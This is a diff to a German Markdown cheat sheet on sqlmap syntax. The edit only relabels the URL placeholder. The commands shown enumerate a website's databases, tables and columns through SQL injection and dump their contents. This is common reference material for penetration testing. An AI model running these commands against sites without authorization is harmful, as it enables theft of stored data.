@@ -209,32 +209,32 @@ exit
 ### Syntax
 - Alles (DBs / Tabellen) auf Website anzeigen(dauert lange):
 ```
-sqlmap.py -u [GET-URL] -a
+sqlmap.py -u [POST-GET-URL] -a
 ```
 
 - Alle Daten von einer Tabelle anzeigen:
 ```
-sqlmap.py -u [URL mit GET] -D [Databasename] -T [Tablename] --dump
+sqlmap.py -u [POST-GET-URL] -D [Databasename] -T [Tablename] --dump
 ```
 
 - DBs auf Website anzeigen:
 ```
-sqlmap.py -u [GET-URL] --dbs
+sqlmap.py -u [POST-GET-URL] --dbs
 ```
 
 - Tabellen von bestimmter DB anzeigen:
 ```
-sqlmap.py -u [URL mit GET] -D [Databasename] --tables
+sqlmap.py -u [POST-GET-URL] -D [Databasename] --tables
 ```
 
 - Spalten von bestimmter Tabelle anzeigen:
 ```
-sqlmap.py -u [URL mit GET] -D [Databasename] -T [Tablename] --columns
+sqlmap.py -u [POST-GET-URL] -D [Databasename] -T [Tablename] --columns
 ```
 
 - Daten von bestimmter Spalten anzeigen:
 ```
-sqlmap.py -u [URL mit GET] -D [Databasename] -T [Tablename] -C [Columname] --dump
+sqlmap.py -u [POST-GET-URL] -D [Databasename] -T [Tablename] -C [Columname] --dump
 ```
 
 ### Beispiel
